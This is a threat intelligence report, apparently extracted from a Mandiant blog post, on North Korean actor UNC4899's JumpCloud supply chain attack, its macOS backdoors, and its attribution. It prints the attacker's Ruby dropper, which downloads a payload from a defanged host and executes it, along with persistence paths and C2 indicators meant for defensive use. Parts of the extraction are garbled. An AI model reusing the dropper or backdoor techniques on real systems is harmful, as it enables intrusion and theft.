[
    {
        "title": "Supply Chain Attack ",
        "content": "On June 27, 2023, at 18:51:57 UTC, Mandiant identified a malicious Ruby script executed via the JumpCloud agent at a downstream customer (a software solutions entity). JumpCloud confirmed the commands framework was used for malicious data injections in their security incident disclosure. The contents and functionalities of this script are outlined below in the Backdoor Payloads section. "
    },
    {
        "title": "Host Artifacts ",
        "content": "Evidence of compromise was observed within the JumpCloud agent log located at the file path  /private/var/log/jcagent.log . \nMandiant observed log entries in jcagent.log that indicated a directive named \"Runworkflow\" triggered execution on the system: \ntime $=$ 2023-06-27 18:51:57.415615-07:00 PID= time=2023-06-27 18:51:57.416036-07:00 PID= time=2023-06-27 18:51:57.416145-07:00 PID= time=2023-06-27 18:51:57.416192-07:00 PID= time $=$ 2023-06-27 18:51:57.416238-07:00 PID= time=2023-06-27 18:51:57.416308-07:00 PID= time=2023-06-27 18:51:57.416550-07:00 PID=8  \nDuring the investigation, Mandiant observed the threat actor target four (4) OSX Ventura systems running either versions 13.3 or 13.4.1. During the forensic analysis of these systems, Mandiant identified a relatively new forensic artifact that proved extremely valuable to the investigation. \nThis forensic artifact is related to Apple's XProtect services, specifically, the XProtect Behavioral Service. There are currently five behavioral-based rules defined by Apple. Information about executed programs that violate one or more of these rules is \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog recorded in the XProtect Database (XPdb), which is stored in SQLite 3 format and located at /var/protected/xprotect/XPdb . At this time, it does not appear that the XProtect Behavioral Service is configured to block execution. \nThrough analysis of data stored in the XPdb, Mandiant identified entries containing specific signing identifiers that correlated to attacker payloads. Specifically, the exec_signing_id field within the XPdb contains information about the signature of the binary, which can be used to help identify the author of a particular signed binary. Mandiant identified three unique signatures associated with malicious files: \nmac  \n555549440ea0d64e96bb34428e08cc8d948b40   \ne7   \np-macos  \n55554944c2a6eb29a7bc3c73acdaa3e0a7a8d8c   \n7   \nsecurityd  \n555549440fca1d2f1e613094b0c768d393f83d7f \nMandiant used these signatures to search the XPdb for additional attacker payloads that were deleted by the threat actor or otherwise unable to be identified through other forms of analysis. \nAn additional field of interest in the XPdb was the exec_cdhash, which contains the cdhash, or Code Directory hash, of the executed binaries. Mandiant identified the historical execution of malicious binaries across multiple systems using cdhash \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog values stored in the XPdb. Because the cdhash is computed based on executable code in the application, Mandiant was able to identify additional malware in the environment despite the files being deleted by the threat actor and the samples having different file hashes. \nFurther fields of interest in the XPdb had the prefix \"responsible_\" and contained information about the parent of the process which violated the behavioral rules. On multiple systems, XPdb entries for the malware contained the parent process of the JumpCloud agent, further evidence that the threat actor leveraged JumpCloud to gain initial access to victim environments. \nThe threat actor was consistently observed removing prior payloads from disk; however, the FSEvents artifacts were able to provide great insight into files that previously existed on disk. The FSEvents contained details on the creation, modification, permission changes, renaming, and removal of files, even if the filesystem no longer contained artifacts indicating the existence of these files remained. Using the node_id field associated with individual entries, Mandiant was able to identify the order of specific threat actor activities on systems and the updated names of renamed files. \nThe following table provides an example of the relevant data obtained from FSEvents: "
    },
    {
        "title": "Initial Access ",
        "content": "Initial access was gained by compromising JumpCloud and inserting malicious code into their commands framework. In at least one instance, the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent. The script contained instructions to download and execute a second stage payload. Within 24 hours of gaining \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog initial access to systems in the victim environment, the threat actor deployed additional backdoors and established persistence via plists. The initial payloads and second stage backdoors were removed from the system. \nThe directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading as legitimate files and applications. \nMandiant retrieved the lightweight Ruby script named init.rb  that was deployed to multiple systems: \nrequire 'open-uri'   \nffn $=$ '/usr/local/bin/com.docker.vmnat'   \nFile.open(ffn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nFile.chmod(0755, ffn)   \nfn $=$ '/usr/local/bin/com.docker.vmnat.lock   \nFile.open(fn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nsystem(ffn) \nThe script downloads two files to locations defined by the variables ffn and fn, but only the first file is executed via the system function. The second file could not be identified on the hosts. "
    },
    {
        "title": "FULLHOUSE.DOORED (com.docker.vmnat, npx-cli, us.zoom.ZoomUpdate) ",
        "content": "The threat actor downloaded and executed   \n/usr/local/bin/com.docker.vmnat  using the aforementioned Ruby script. However,   \ncom.docker.vmnat  was removed from the system. Fortunately, an artifact of its execution was   \ndiscovered in the /private/var/db/oah   \ndirectory. \nBecause com.docker.vmnat was likely compiled for x86-64 systems, the code had to be translated to ARM64 to successfully execute on the target system. As a result, Apple's Rosetta 2 translator produced a com.docker.vmnat.aot  file under the oah directory that included the translated ARM64 code as well as symbols present in the original com.docker.vmnat  application. Based on these symbols, Mandiant assesses with moderate confidence that com.docker.vmnat  was a version of the FULLHOUSE.DOORED backdoor. \nFULLHOUSE.DOORED is a backdoor written in $\\mathsf{C}/\\mathsf{C}++$ that communicates using HTTP. It incorporates the capabilities of the FULLHOUSE tunneler in addition to supporting backdoor commands including shell command execution, file transfer, file management, and process injection. The command and control (C2) server must be configured from either the command line or a configuration file. \nAdditional attacker backdoors identified on systems with names that masquaraded as legitimate binaries and also produced AOT files upon translation (e.g., npx-cli  and npx-cli.aot ). "
    },
    {
        "title": "STRATOFEAR (com.google.kservice, us.zoom.ZoomService) ",
        "content": "Limited forensic evidence existed to determine exactly how STRATOFEAR was deployed to systems in the victim environment; however, in each instance, STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED. On the systems analyzed, only one backdoor remained on the system, indicating the threat actor may have used FULLHOUSE.DOORED as a first-stage backdoor before deploying STRATOFEAR as a second-stage backdoor. \nSTRATOFEAR is a modular backdoor that communicates with C2 servers using a protocol specified in its C2 configuration, which is decrypted from a local file. The backdoor's primary functionality involves retrieving and executing additional modules. Modules may be downloaded from a remote server or loaded from disk. \nSTRATOFEAR contains an embedded configuration that includes two file paths. The first path ( /Library/Fonts/ArialUnicode.ttf.md5 ) stores the backdoor's full configuration, including its C2 servers. The second path \n( /Library/Fonts/ArialUnicode.ttf.md5.1 ) may be used to store logging information related to monitor activity that is described as follows. \nA portion of STRATOFEAR's 0x1052-byte decrypted configuration is shown as follows. \nSTRATOFEAR refers to the four-byte value at offset 0x410 ( 0x16325 ) as a uid. The four-byte value at offset $0\\times416$ ( 0x3e8  or decimal 1000 ) is the backdoor's version number. STRATOFEAR's configuration file may include AES-128-encrypted modules; however, this was not the case in the discovered sample. \nA subset of commands supported by STRATOFEAR are listed in the following table: \nSystem information collected using command 0x07 includes the system name, current username, and the system's architecture. \nSTRATOFEAR supports the module-related commands listed in the following table: \nDownloaded modules may be written to a .tmp  file in the $\\$1$ TMPDIR  or /tmp  directory. The file's name consists of six randomly-generated alphanumeric characters. \nSTRATOFEAR's code references five predefined module types that have an ID value and an internal name: \nSTRATOFEAR also contains strings that are used to report a module's location. Possible locations are Config \", \" Static \", or \" Path \" followed by a file path. \nSTRATOFEAR  employs what it refers to as \"monitors\" to monitor system activity using up to 16 threads. The backdoor references eight different monitors and includes descriptions for all but one $(\\theta\\times45)$ . \nMandiant directly observed one (1) variant of STRATOFEAR as a Mach-O executable compiled for ARM64 systems that contained a self-signed certificate with a particular Common Name (CN). Mandiant identified a second sample on VirusTotal with the same self-signed certificate CN. The second sample is a Windows DLL protected using VMProtect that was first submitted to VirusTotal on October 19, 2022. Mandiant assesses with moderate confidence that the DLL is a Windows version of STRATOFEAR. "
    },
    {
        "title": "TIEDYE (xpc.protect) ",
        "content": "Limited forensic evidence existed to determine exactly how TIEDYE was deployed to systems in the victim environment; however, like STRATOFEAR, TIEDYE was likely deployed as a second-stage backdoor by FULLHOUSE.DOORED. \nA Mach-O executable named xpc.protect was identified and determined to be an evolution of the TIEDYE backdoor. TIEDYE can communicate with a C2 server using a range of supported protocols described as follows. Its capabilities include retrieving and executing additional payloads, collecting basic system information, and executing shell commands. \nA portion of TIEDYE's raw configuration is shown as follows: \nThe configuration contains two C2 servers that are prefixed with a protocol identifier. TIEDYE supports the following \nprotocols:  tcp ,  tcp6 ,  udp ,  upd6 ,  http , https ,  proxy_socks4 ,  proxy_socks4a ,  pipe , ssl ,  ssl3 , and  rdp . The file path at the end of the configuration is used to store configuration data that is encrypted using AES-128. \nPrevious versions of TIEDYE were configured to persist via a LaunchAgent. The current version contains the functionality to create a LaunchAgent at one of the following locations but is not configured to do so: \n\\$HOME/Library/LaunchAgents/com.studentd.agent.plist /Library/LaunchDaemons/com.studentd.agent.plist \nTIEDYE has similarities to RABBITHUNT, which is a backdoor written in $\\mathsf{C}\\substack{++}$ that communicates via a custom binary protocol over TCP. RABBITHUNT's core functionality is implemented through modules downloaded directly into memory or read from a local file. Capabilities added via modules include \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog reverse shell, file transfer, process creation, and process termination. "
    },
    {
        "title": "DPRK Cryptocurrency Targeting ",
        "content": "Mandiant identified UNC4899 targeting MacOS keychains and reconnaissance data associated with executives and internal security teams. \nUNC4899 targeting overlaps with a separate RGBaligned group, APT43, who in July, 2023 displayed interest in the cryptocurrency vertical, specifically targeting a variety of C-Suite executives from multiple fintech and cryptocurrency companies in the United States, South Korea, Hong Kong, and Singapore. Many of the individuals work at organizations related to financial services, cryptocurrency, blockchain, web3 and related entities. The overlaps in targeting and sharing of infrastructure amongst DPRK groups highlights the continued targeting and coordinated interest in the cryptocurrency field. "
    },
    {
        "title": "Operational Security Fumble ",
        "content": "Mandiant has observed RGB units utilize a series of Operational Relay Boxes (ORBs) using L2TP IPsec tunnels along with commercial VPN providers to \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog obscure their source address. These relays seem to be heavily shared among units under the RGB umbrella. \nMandiant observed UNC4899 utilize various VPN providers as a final hop, the most common being ExpressVPN, but connections to NordVPN, TorGuard and many other providers have also been observed. There have been many occasions in which DPRK threat actors did not employ this last hop, or mistakenly did not utilize this while conducting actions on operations on the victim's network. \nThe VPNs used by RGB actors occasionally fail, which reveals the IP addresses of the actor's true origins. Mandiant observed the DPRK threat actor UNC4899 connecting directly to an attackercontrolled ORB from their 175.45.178[.]0/24 subnet. (Ryugyong Dong, Pyongyang). Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived. Figure 2 provides an overview of the network infrastructure used in this campaign. \nAdditionally, Mandiant was able to uncover additional infrastructure due to the fact that a PTR record was never changed from a previous operation. Mandiant has previously identified the domain wasxxv[.]site being used by North Korean threat actors. Additionally, the IP address 198.244.135[.]250 is being utilized for another C2 domain prontoposer[.]com while still having a PTR record to the domain previously identified. "
    },
    {
        "title": "Attribution ",
        "content": "Mandiant is tracking this activity as UNC4899, a suspected North Korean actor. We assess with high confidence that UNC4899 is a cryptocurrencyfocused group that falls under the RGB. UNC4899's targeting is selective, and they have been observed gaining access to victim networks through JumpCloud. Mandiant has observed overlap amongst multiple North Korean groups that fall under the RGB. These groups commonly share infrastructure to complete their actions on objectives. Mandiant has observed UNC2970, APT43, and UNC4899 all utilize similar infrastructure \nMandiant has observed an increase in financially motivated operations by DPRK actors in the past year, particularly those focused on the cryptocurrency industry. RGB-aligned cryptofocused groups, publicly reported under the umbrella term Lazarus, and clear variants of historic, established APT threat actors such as the open source \"TraderTraitor\" and \"AppleJeus\", have increasingly conducted financially motivated \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog operations that have affected the cryptocurrency industry and various blockchain platforms. "
    }
]